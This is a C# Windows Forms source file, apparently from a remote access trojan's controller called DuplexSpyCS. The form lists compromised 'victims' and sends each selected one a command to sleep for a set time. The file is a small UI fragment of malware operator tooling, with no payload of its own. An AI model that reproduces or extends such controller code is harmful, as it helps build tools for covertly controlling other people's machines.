using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmClntSleep : Form
    {
        public List<clsVictim> m_lsVictim;
        public frmMain frmMain;

        public frmClntSleep()
        {
            InitializeComponent();
        }

        void Received(clsTcpListener listener, clsVictim v, string[] cmd)
        {
            if (cmd[0] == "clnt")
            {
                if (cmd[1] == "sl") //Sleep
                {

                }
            }
        }

        void setup()
        {
            if (m_lsVictim == null)
            {
                MessageBox.Show("m_lsVictim is null", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close();
                return;
            }

            foreach (clsVictim v in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(v.ID);
                item.SubItems.Add("?");
                item.Tag = v;

                listView1.Items.Add(item);
            }

            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
        }

        private void frmClntSleep_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Check All
        private void button1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck All
        private void button2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }
        //GO
        private void button3_Click(object sender, EventArgs e)
        {
            int nThd = (int)numericUpDown1.Value;
            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(nThd, nThd);
            foreach (ListViewItem item in listView1.CheckedItems)
            {
                ThreadPool.QueueUserWorkItem(x =>
                {
                    clsVictim v = (clsVictim)item.Tag;
                    v.SendCommand($"clnt|sl|{(int)numericUpDown2.Value}");
                });
            }
        }
    }
}
